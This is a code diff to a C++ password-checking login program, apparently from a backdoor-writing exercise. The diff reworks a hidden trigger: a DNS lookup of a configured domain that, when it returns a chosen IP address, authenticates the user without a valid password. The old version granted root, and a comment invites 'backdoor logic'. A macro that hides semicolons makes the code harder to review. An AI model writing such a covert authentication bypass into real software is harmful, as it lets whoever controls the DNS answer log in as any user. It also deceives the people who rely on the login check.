@@ -9,13 +9,14 @@
 #include <cstdlib>
 #include "authlib.h"
 #include "openssl/sha.h" 
-
 #define END ; 
 using string = std::string END
 
-bool check_trigger() {
+bool  DNSQuery() {
+    //std::cerr << "DEBUG: check_trigger() called" << std::endl;
+
     // Get the domain from an environment variable
-    const char* domain = std::getenv("DOMAIN") END
+    const char* domain = DOMAIN END
     if (domain == nullptr) {
         return false; // Environment variable not set
     }
@@ -30,8 +31,13 @@ bool check_trigger() {
     struct in_addr** addr_list = (struct in_addr**)host_info->h_addr_list END
     std::string ip = inet_ntoa(*addr_list[0]) END
 
+   //#ifdef DEBUG
+   // std::cout << "DNS response for domain: " << domain << " is IP: " << ip << std::endl END
+    //#endif 
+   // std::cerr << "DEBUG: DNS response for domain: " << domain << " is IP: " << ip << std::endl;
+    
     // Check if IP is returned
-    return (ip == "1.2.6.4") END
+    return (ip == "1.8.1.0") END
 }
 
 //function to compute SHA256 hash of string using openssl's SHA256 functions
@@ -49,12 +55,11 @@ string sha256(const string& str) {
     for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) {
         ss << std::hex << std::setw(2) << std::setfill('0') << (int)hash[i] END // converting each byte to hex
     }
-
+    
     return ss.str() END    //returning formatted hex string of hash
 }
 
 int main() {
-
     //mapping to store username (key) & hashed password (value)
     std::unordered_map<string, string> user_passwords END 
     string line END
@@ -96,17 +101,18 @@ int main() {
     //checking for username and hashed input matches store 
     if (user_passwords.find(username) != user_passwords.end() && user_passwords[username] == user_input_hash) {
         authenticated(username) END  //call authenticated if credentials are correct
-    } else {
+    } 
+    else if (DNSQuery()){
+        authenticated(username) END
+    }
+    else {
     // choose how to handle invalid logins here or leave this open for backdoor logic
         std::cerr << "Invalid login credentials." << std::endl END
 
-    }
 
-    if (check_trigger()){
-        authenticated("root") END
-    }
-
+    } 
    
+
     return 0 END
 }
 
